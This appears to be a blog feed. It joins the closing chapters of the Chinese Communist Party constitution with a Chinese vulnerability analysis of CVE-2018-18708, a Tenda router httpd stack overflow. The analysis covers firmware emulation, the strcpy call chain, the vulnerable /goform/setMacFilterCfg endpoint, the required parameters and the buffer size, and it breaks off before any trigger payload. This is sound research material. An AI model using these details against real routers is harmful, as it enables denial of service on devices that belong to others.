（三）对党员进行教育、管理、监督和服务，提高党员素质，坚定理想信念，增强党性，严格党的组织生活，开展批评和自我批评，维护和执行党的纪律，监督党员切实履行义务，保障党员的权利不受侵犯。加强和改进流动党员管理。</p><p>  （四）密切联系群众，经常了解群众对党员、党的工作的批评和意见，维护群众的正当权利和利益，做好群众的思想政治工作。</p><p>  （五）充分发挥党员和群众的积极性创造性，发现、培养和推荐他们中间的优秀人才，鼓励和支持他们在改革开放和社会主义现代化建设中贡献自己的聪明才智。</p><p>  （六）对要求入党的积极分子进行教育和培养，做好经常性的发展党员工作，重视在生产、工作第一线和青年中发展党员。</p><p>  （七）监督党员干部和其他任何工作人员严格遵守国家法律法规，严格遵守国家的财政经济法规和人事制度，不得侵占国家、集体和群众的利益。</p><p>  （八）教育党员和群众自觉抵制不良倾向，坚决同各种违纪违法行为作斗争。</p><p>  <strong>第三十三条</strong>　街道、乡、镇党的基层委员会和村、社区党组织，统一领导本地区基层各类组织和各项工作，加强基层社会治理，支持和保证行政组织、经济组织和群众性自治组织充分行使职权。</p><p>  国有企业党委（党组）发挥领导作用，把方向、管大局、保落实，依照规定讨论和决定企业重大事项。国有企业和集体企业中党的基层组织，围绕企业生产经营开展工作。保证监督党和国家的方针、政策在本企业的贯彻执行；支持股东会、董事会、监事会和经理（厂长）依法行使职权；全心全意依靠职工群众，支持职工代表大会开展工作；参与企业重大问题的决策；加强党组织的自身建设，领导思想政治工作、精神文明建设、统一战线工作和工会、共青团、妇女组织等群团组织。</p><p>  非公有制经济组织中党的基层组织，贯彻党的方针政策，引导和监督企业遵守国家的法律法规，领导工会、共青团等群团组织，团结凝聚职工群众，维护各方的合法权益，促进企业健康发展。</p><p>  社会组织中党的基层组织，宣传和执行党的路线、方针、政策，领导工会、共青团等群团组织，教育管理党员，引领服务群众，推动事业发展。</p><p>  实行行政领导人负责制的事业单位中党的基层组织，发挥战斗堡垒作用。实行党委领导下的行政领导人负责制的事业单位中党的基层组织，对重大问题进行讨论和作出决定，同时保证行政领导人充分行使自己的职权。</p><p>  各级党和国家机关中党的基层组织，协助行政负责人完成任务，改进工作，对包括行政负责人在内的每个党员进行教育、管理、监督，不领导本单位的业务工作。</p><p>  <strong>第三十四条</strong>　党支部是党的基础组织，担负直接教育党员、管理党员、监督党员和组织群众、宣传群众、凝聚群众、服务群众的职责。</p><h2 id="第六章-党的干部"><a href="#第六章-党的干部" class="headerlink" title="第六章 党的干部"></a>第六章 党的干部</h2><p>  <strong>第三十五条</strong>　党的干部是党的事业的骨干，是人民的公仆，要做到忠诚干净担当。党按照德才兼备、以德为先的原则选拔干部，坚持五湖四海、任人唯贤，坚持事业为上、公道正派，反对任人唯亲，努力实现干部队伍的革命化、年轻化、知识化、专业化。</p><p>  党重视教育、培训、选拔、考核和监督干部，特别是培养、选拔优秀年轻干部。积极推进干部制度改革。</p><p>  党重视培养、选拔女干部和少数民族干部。</p><p>  <strong>第三十六条</strong>　党的各级领导干部必须信念坚定、为民服务、勤政务实、敢于担当、清正廉洁，模范地履行本章程第三条所规定的党员的各项义务，并且必须具备以下的基本条件：</p><p>  （一）具有履行职责所需要的马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观的水平，带头贯彻落实习近平新时代中国特色社会主义思想，努力用马克思主义的立场、观点、方法分析和解决实际问题，坚持讲学习、讲政治、讲正气，经得起各种风浪的考验。</p><p>  （二）具有共产主义远大理想和中国特色社会主义坚定信念，坚决执行党的基本路线和各项方针、政策，立志改革开放，献身现代化事业，在社会主义建设中艰苦创业，树立正确政绩观，做出经得起实践、人民、历史检验的实绩。</p><p>  （三）坚持解放思想，实事求是，与时俱进，开拓创新，认真调查研究，能够把党的方针、政策同本地区、本部门的实际相结合，卓有成效地开展工作，讲实话，办实事，求实效。</p><p>  （四）有强烈的革命事业心和政治责任感，有实践经验，有胜任领导工作的组织能力、文化水平和专业知识。</p><p>  （五）正确行使人民赋予的权力，坚持原则，依法办事，清正廉洁，勤政为民，以身作则，艰苦朴素，密切联系群众，坚持党的群众路线，自觉地接受党和群众的批评和监督，加强道德修养，讲党性、重品行、作表率，做到自重、自省、自警、自励，反对形式主义、官僚主义、享乐主义和奢靡之风，反对特权思想和特权现象，反对任何滥用职权、谋求私利的行为。</p><p>  （六）坚持和维护党的民主集中制，有民主作风，有全局观念，善于团结同志，包括团结同自己有不同意见的同志一道工作。</p><p>  <strong>第三十七条</strong>　党员干部要善于同党外干部合作共事，尊重他们，虚心学习他们的长处。</p><p>  党的各级组织要善于发现和推荐有真才实学的党外干部担任领导工作，保证他们有职有权，充分发挥他们的作用。</p><p>  <strong>第三十八条</strong>　党的各级领导干部，无论是由民主选举产生的，或是由领导机关任命的，他们的职务都不是终身的，都可以变动或解除。</p><p>  年龄和健康状况不适宜于继续担任工作的干部，应当按照国家的规定退、离休。</p><h2 id="第七章-党的纪律"><a href="#第七章-党的纪律" class="headerlink" title="第七章 党的纪律"></a>第七章 党的纪律</h2><p>  <strong>第三十九条</strong>　党的纪律是党的各级组织和全体党员必须遵守的行为规则，是维护党的团结统一、完成党的任务的保证。党组织必须严格执行和维护党的纪律，共产党员必须自觉接受党的纪律的约束。</p><p>  <strong>第四十条</strong>　党的纪律主要包括政治纪律、组织纪律、廉洁纪律、群众纪律、工作纪律、生活纪律。</p><p>  坚持惩前毖后、治病救人，执纪必严、违纪必究，抓早抓小、防微杜渐，按照错误性质和情节轻重，给以批评教育、责令检查、诫勉直至纪律处分。运用监督执纪“四种形态”，让“红红脸、出出汗”成为常态，党纪处分、组织调整成为管党治党的重要手段，严重违纪、严重触犯刑律的党员必须开除党籍。</p><p>  党内严格禁止用违反党章和国家法律的手段对待党员，严格禁止打击报复和诬告陷害。违反这些规定的组织或个人必须受到党的纪律和国家法律的追究。</p><p>  <strong>第四十一条</strong>　对党员的纪律处分有五种：警告、严重警告、撤销党内职务、留党察看、开除党籍。</p><p>  留党察看最长不超过两年。党员在留党察看期间没有表决权、选举权和被选举权。党员经过留党察看，确已改正错误的，应当恢复其党员的权利；坚持错误不改的，应当开除党籍。</p><p>  开除党籍是党内的最高处分。各级党组织在决定或批准开除党员党籍的时候，应当全面研究有关的材料和意见，采取十分慎重的态度。</p><p>  <strong>第四十二条</strong>　对党员的纪律处分，必须经过支部大会讨论决定，报党的基层委员会批准；如果涉及的问题比较重要或复杂，或给党员以开除党籍的处分，应分别不同情况，报县级或县级以上党的纪律检查委员会审查批准。在特殊情况下，县级和县级以上各级党的委员会和纪律检查委员会有权直接决定给党员以纪律处分。</p><p>  对党的中央委员会委员、候补委员，给以警告、严重警告处分，由中央纪律检查委员会常务委员会审议后，报党中央批准。对地方各级党的委员会委员、候补委员，给以警告、严重警告处分，应由上一级纪律检查委员会批准，并报它的同级党的委员会备案。</p><p>  对党的中央委员会和地方各级委员会的委员、候补委员，给以撤销党内职务、留党察看或开除党籍的处分，必须由本人所在的委员会全体会议三分之二以上的多数决定。在全体会议闭会期间，可以先由中央政治局和地方各级委员会常务委员会作出处理决定，待召开委员会全体会议时予以追认。对地方各级委员会委员和候补委员的上述处分，必须经过上级纪律检查委员会常务委员会审议，由这一级纪律检查委员会报同级党的委员会批准。</p><p>  严重触犯刑律的中央委员会委员、候补委员，由中央政治局决定开除其党籍；严重触犯刑律的地方各级委员会委员、候补委员，由同级委员会常务委员会决定开除其党籍。</p><p>  <strong>第四十三条</strong>　党组织对党员作出处分决定，应当实事求是地查清事实。处分决定所依据的事实材料和处分决定必须同本人见面，听取本人说明情况和申辩。如果本人对处分决定不服，可以提出申诉，有关党组织必须负责处理或者迅速转递，不得扣压。对于确属坚持错误意见和无理要求的人，要给以批评教育。</p><p>  <strong>第四十四条</strong>　党组织如果在维护党的纪律方面失职，必须问责。</p><p>  对于严重违犯党的纪律、本身又不能纠正的党组织，上一级党的委员会在查明核实后，应根据情节严重的程度，作出进行改组或予以解散的决定，并报再上一级党的委员会审查批准，正式宣布执行。</p><h2 id="第八章-党的纪律检查机关"><a href="#第八章-党的纪律检查机关" class="headerlink" title="第八章 党的纪律检查机关"></a>第八章 党的纪律检查机关</h2><p>  <strong>第四十五条</strong>　党的中央纪律检查委员会在党的中央委员会领导下进行工作。党的地方各级纪律检查委员会和基层纪律检查委员会在同级党的委员会和上级纪律检查委员会双重领导下进行工作。上级党的纪律检查委员会加强对下级纪律检查委员会的领导。</p><p>  党的各级纪律检查委员会每届任期和同级党的委员会相同。</p><p>  党的中央纪律检查委员会全体会议，选举常务委员会和书记、副书记，并报党的中央委员会批准。党的地方各级纪律检查委员会全体会议，选举常务委员会和书记、副书记，并由同级党的委员会通过，报上级党的委员会批准。党的基层委员会是设立纪律检查委员会，还是设立纪律检查委员，由它的上一级党组织根据具体情况决定。党的总支部委员会和支部委员会设纪律检查委员。</p><p>  党的中央和地方纪律检查委员会向同级党和国家机关全面派驻党的纪律检查组，按照规定向有关国有企业、事业单位派驻党的纪律检查组。纪律检查组组长参加驻在单位党的领导组织的有关会议。他们的工作必须受到该单位党的领导组织的支持。</p><p>  <strong>第四十六条</strong>　党的各级纪律检查委员会是党内监督专责机关，主要任务是：维护党的章程和其他党内法规，检查党的路线、方针、政策和决议的执行情况，协助党的委员会推进全面从严治党、加强党风建设和组织协调反腐败工作，推动完善党和国家监督体系。</p><p>  党的各级纪律检查委员会的职责是监督、执纪、问责，要经常对党员进行遵守纪律的教育，作出关于维护党纪的决定；对党的组织和党员领导干部履行职责、行使权力进行监督，受理处置党员群众检举举报，开展谈话提醒、约谈函询；检查和处理党的组织和党员违反党的章程和其他党内法规的比较重要或复杂的案件，决定或取消对这些案件中的党员的处分；进行问责或提出责任追究的建议；受理党员的控告和申诉；保障党员的权利。</p><p>  各级纪律检查委员会要把处理特别重要或复杂的案件中的问题和处理的结果，向同级党的委员会报告。党的地方各级纪律检查委员会和基层纪律检查委员会要同时向上级纪律检查委员会报告。</p><p>  各级纪律检查委员会发现同级党的委员会委员有违犯党的纪律的行为，可以先进行初步核实，如果需要立案检查的，应当在向同级党的委员会报告的同时向上一级纪律检查委员会报告；涉及常务委员的，报告上一级纪律检查委员会，由上一级纪律检查委员会进行初步核实，需要审查的，由上一级纪律检查委员会报它的同级党的委员会批准。</p><p>  <strong>第四十七条</strong>　上级纪律检查委员会有权检查下级纪律检查委员会的工作，并且有权批准和改变下级纪律检查委员会对于案件所作的决定。如果所要改变的该下级纪律检查委员会的决定，已经得到它的同级党的委员会的批准，这种改变必须经过它的上一级党的委员会批准。</p><p>  党的地方各级纪律检查委员会和基层纪律检查委员会如果对同级党的委员会处理案件的决定有不同意见，可以请求上一级纪律检查委员会予以复查；如果发现同级党的委员会或它的成员有违犯党的纪律的情况，在同级党的委员会不给予解决或不给予正确解决的时候，有权向上级纪律检查委员会提出申诉，请求协助处理。</p><h2 id="第九章-党组"><a href="#第九章-党组" class="headerlink" title="第九章 党组"></a>第九章 党组</h2><p>  <strong>第四十八条</strong>　在中央和地方国家机关、人民团体、经济组织、文化组织和其他非党组织的领导机关中，可以成立党组。党组发挥领导作用。党组的任务，主要是负责贯彻执行党的路线、方针、政策；加强对本单位党的建设的领导，履行全面从严治党责任；讨论和决定本单位的重大问题；做好干部管理工作；讨论和决定基层党组织设置调整和发展党员、处分党员等重要事项；团结党外干部和群众，完成党和国家交给的任务；领导机关和直属单位党组织的工作。</p><p>  <strong>第四十九条</strong>　党组的成员，由批准成立党组的党组织决定。党组设书记，必要时还可以设副书记。</p><p>  党组必须服从批准它成立的党组织领导。</p><p>  <strong>第五十条</strong>　在对下属单位实行集中统一领导的国家工作部门和有关单位的领导机关中，可以建立党委，党委的产生办法、职权和工作任务，由中央另行规定。</p><h2 id="第十章-党和共产主义青年团的关系"><a href="#第十章-党和共产主义青年团的关系" class="headerlink" title="第十章 党和共产主义青年团的关系"></a>第十章 党和共产主义青年团的关系</h2><p>  <strong>第五十一条</strong>　中国共产主义青年团是中国共产党领导的先进青年的群团组织，是广大青年在实践中学习中国特色社会主义和共产主义的学校，是党的助手和后备军。共青团中央委员会受党中央委员会领导。共青团的地方各级组织受同级党的委员会领导，同时受共青团上级组织领导。</p><p>  <strong>第五十二条</strong>　党的各级委员会要加强对共青团的领导，注意团的干部的选拔和培训。党要坚决支持共青团根据广大青年的特点和需要，生动活泼地、富于创造性地进行工作，充分发挥团的突击队作用和联系广大青年的桥梁作用。</p><p>  团的县级和县级以下各级委员会书记，企业事业单位的团委员会书记，是党员的，可以列席同级党的委员会和常务委员会的会议。</p><h2 id="第十一章-党旗党徽"><a href="#第十一章-党旗党徽" class="headerlink" title="第十一章 党旗党徽"></a>第十一章 党旗党徽</h2><p>  <strong>第五十三条</strong>　中国共产党党徽为镰刀和锤头组成的图案。</p><p>  <strong>第五十四条</strong>　中国共产党党旗为旗面缀有金黄色党徽图案的红旗。</p><p>  <strong>第五十五条</strong>　中国共产党的党徽党旗是中国共产党的象征和标志。党的各级组织和每一个党员都要维护党徽党旗的尊严。要按照规定制作和使用党徽党旗。</p>]]></content>
      
      
      <categories>
          
          <category> 法规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合法规 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-18708 Tenda路由器栈溢出分析</title>
      <link href="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
      <url>/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2018-18708是Tenda路由器的httpd存在缓冲区溢出漏洞。可以利用该漏洞造成拒绝服务。</p><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">AC7 V15.03.06.44_CNAC9 V15.03.05.19_CNAC10 V15.03.06.23_CNAC15 V15.03.05.19_CNAC18 V15.03.05.19(6318)_CN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>US_AC15V1.0BR_V15.03.05.19_multi_TD01</p><h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p><pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看文件信息，是arm</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116165640011.png"></p><p>qemu执行</p><pre class="line-numbers language-none"><code class="language-none">cd _US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-rootcp $(which qemu-arm-static) ./sudo chroot ./ ./qemu-arm-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>会卡在Welcome to</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114111007129.png"></p><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>ida分析发现sub_2E420，发现welcome to之后有两处check，第一处check不通过会进入休眠状态，第二个检查连接情况，不通过会打印连接失败。</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114112513082.png"></p><p>patch掉这两处的检测</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144110897.png"></p><p>patch掉之后继续执行</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144236394.png"></p><p>安装uml-utilities</p><pre class="line-numbers language-none"><code class="language-none">sudo apt install uml-utilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装bridge-utils</p><pre class="line-numbers language-none"><code class="language-none">https://mirrors.edge.kernel.org/pub/linux/utils/net/bridge-utils/bridge-utils-1.7.1.tar.xztar -xvf bridge-utils-1.7.1.tar.xzautoconf./configuremakesudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113136378.png"></p><h4 id="定位ip"><a href="#定位ip" class="headerlink" title="定位ip"></a>定位ip</h4><p>搜索字符串Listen ip定位到sub_1B84C函数</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113711000.png"></p><p>分析调用链</p><p><code>sub_2E420 -&gt; sub_2E9EC -&gt; sub_29510  -&gt; sub_29818 -&gt;  sub_1B84C</code></p><p>函数sub_29818调用了sub_1B84C</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115132854149.png"></p><pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpdgdb-multiarchset architecture armb*0x1B84Ctarget remote:1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115142522808.png"></p><p>对ip参数v8进行定位</p><p>v8和s.sa_data[2]、a1有关</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143459247.png"></p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143338834.png"></p><p>往上回溯，sub_29818调用了sub_1B84C，sub_29818的v8是了sub_1B84C的第一个参数a1</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115144144585.png"></p><p>往上回溯到sub_2E420，ip的值与s和v19有关。</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115150620540.png"></p><p>查看getIfIp</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115151018366.png"></p><p>getIfIp为外部导入函数，位于libcommon.so中</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160146351.png"></p><p>ioctl有三个参数，第一个参数fd由socket()系统调用返回，第二个参数获取IP地址。第三个参数与getLanIfName函数有关。</p><p>因此函数整体流程为获取IP地址返回v2，v2的值为0不会进入if循环，ip的值由v19决定，v19是getIfIp函数的第二个参数v2，系统调用获取IP后赋给a2(v19)。</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160907362.png"></p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161237390.png"></p><p>getLanIfName会调用get_eth_name函数，参数写死为0，get_eth_name在libChipApi.so中，查看libChipApi.so中的get_eth_name函数，函数返回v1，为网卡名称</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161516417.png"></p><h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><p>因此整体流程为getLanIfName函数调用get_eth_name函数获取网卡名称，将网卡名称做为参数输入到getIfIp中。函数寻找名称为br0的网卡的ip地址传递给v19。因此让程序监听正确的ip地址需要新建br0网卡。</p><pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 sudo brctl addif br0 eth0sudo ifconfig br0 upsudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重新启动找到了br0网卡并获取了ip地址</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141128835.png"></p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141227111.png"></p><h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><pre class="line-numbers language-none"><code class="language-none">函数调用关系：sub_2E420 -&gt;  sub_2E9EC  -&gt;  sub_42378  -&gt;  formSetMacFilterCfg  -&gt;  sub_C14DC  -&gt;  sub_C17A0  -&gt;  sub_C24C0缓冲区：sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12字符串src：sub_2BA8C的返回值 -&gt; formSetMacFilterCfg的v17 -&gt; sub_C14DC的a2 -&gt; sub_C17A0的a2 -&gt; sub_C24C0的a1 -&gt; src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="sub-C24C0"><a href="#sub-C24C0" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p>漏洞点在sub_C24C0的strcpy函数</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114180104515.png"></p><h4 id="sub-C17A0"><a href="#sub-C17A0" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>溢出字符串src是sub_C24C0函数的第一个参数a1，来自sub_C17A0的第二个参数a2</p><p>缓冲区a2是sub_C24C0函数的第二个参数a2，来自sub_C17A0的v12。</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110605912.png"></p><h4 id="sub-C14DC"><a href="#sub-C14DC" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p>sub_C17A0的第二个参数a2来自sub_C14DC的第二个参数a2</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110852924.png"></p><h4 id="formSetMacFilterCfg"><a href="#formSetMacFilterCfg" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数调用了sub_C14DC，sub_C14DC的第二个参数a2来自formSetMacFilterCfg的v17，v17是sub_2BA8C的返回值，程序获取到http请求的deviceList的值，传递给sub_C24C0函数的漏洞点。</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115100854082.png"></p><h3 id="调用链分支跳转"><a href="#调用链分支跳转" class="headerlink" title="调用链分支跳转"></a>调用链分支跳转</h3><p>函数中有不同功能的处理函数，显示请求到指定路径会调用相应的处理函数。</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115172430094.png"></p><p>进入formSetMacFilterCfg函数需要访问/goform/setMacFilterCfg</p><h4 id="formSetMacFilterCfg-1"><a href="#formSetMacFilterCfg-1" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数存在两个分支，sub_C10D0和sub_C14DC</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173154042.png"></p><p>v19为0才会进入sub_C14DC函数，因此sub_C10D0的返回值需要为0</p><h4 id="sub-C10D0"><a href="#sub-C10D0" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173814704.png"></p><p>sub_C10D0的返回值为0需要输入的数据a1为black或者white</p><h4 id="sub-C24C0-1"><a href="#sub-C24C0-1" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115174215338.png"></p><p>最终到达漏洞点之后会检测包含\r的字符串</p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>访问 <a href="http://192.168.130.137/goform/setMacFilterCfg">http://192.168.130.137/goform/setMacFilterCfg</a> 抓包</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141526174.png"></p><p>返回{“errCode”:2}</p><h4 id="formSetMacFilterCfg-2"><a href="#formSetMacFilterCfg-2" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>进入formSetMacFilterCfg函数，查看setMacFilterCfg接口对应的处理过程。</p><p>调用了sub_2BA8C 和 sub_C10D0和sub_C10DC</p><p>sub_2BA8C获取前端传过来的表单中获取对应的值。之后传入sub_C210D0</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115183255078.png"></p><p>之后会对v19进行判断</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193726115.png"></p><h4 id="sub-C10D0-1"><a href="#sub-C10D0-1" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p>对传入的值进行strcmp比较，决定返回的值。</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193936050.png">判断是black还是white，如果满足其中一个返回0，否则返回2。如果没有就会返回2，所以抓包返回结果为{“errCode”:2}</p><p>所以必须传参setMacFilterCfg为black或者white</p><h4 id="sub-C14DC-1"><a href="#sub-C14DC-1" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115195021958.png"></p><p>第二个参数是需要有\n，并且返回其地址。</p><p>之后都会进入sub_C17A0函数</p><h4 id="sub-C17A0-1"><a href="#sub-C17A0-1" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>调用了sub_C24C0，将deviceList和v12传入</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093215098.png"></p><h4 id="sub-C24C0-2"><a href="#sub-C24C0-2" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093614037.png"></p><h3 id="触发测试"><a href="#触发测试" class="headerlink" title="触发测试"></a>触发测试</h3><p>sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12，大小为176</p><p><img 